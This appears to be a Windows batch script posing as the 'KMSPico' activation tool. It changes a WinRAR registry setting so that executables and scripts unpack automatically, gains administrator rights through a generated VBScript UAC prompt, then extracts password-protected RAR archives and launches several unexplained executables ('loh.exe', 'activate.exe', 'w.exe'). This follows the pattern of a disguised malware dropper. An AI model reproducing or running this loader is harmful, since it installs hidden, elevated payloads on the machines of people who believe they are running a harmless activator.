@echo off
title KMSPico is working...&cls&echo ============================================================================&echo Wait...
reg add HKEY_CURRENT_USER\Software\WinRAR\Viewer /v "ViewerUnpackAll" /t "REG_SZ" /d "*.exe *.msi *.htm *.html *.part*.rar *.bat" /f

if not exist "%~dp0Uninstall" goto work1
if exist "%~dp0Uninstall" goto work2
:work1
echo PLEASE RESTART THIS FILE AGAIN TO GET ACTIVATION... | POR FAVOR REINICIE ESTE ARCHIVO OTRA VEZ PARA OBTENER LA ACTIVACIÓN...
timeout /t 10
exit

:work2
REM  --> Check for permissions  
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"  

REM --> If error flag set, we do not have admin.  
if '%errorlevel%' NEQ '0' (  
    echo Requesting administrative privileges...  
    goto UACPrompt  
) else ( goto gotAdmin )  

:UACPrompt  
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"  
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B  

:gotAdmin  
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )   
    pushd "%CD%"  
    CD /D "%~dp0" 
@echo off
cd /d "%~dp0Uninstall"
start loh.exe
timeout /t 10
unrar x -o+ -pdialog "dialog.rar"
break
start activate.exe
unrar x -o+ -pactiv "activ.rar"
break
start w.exe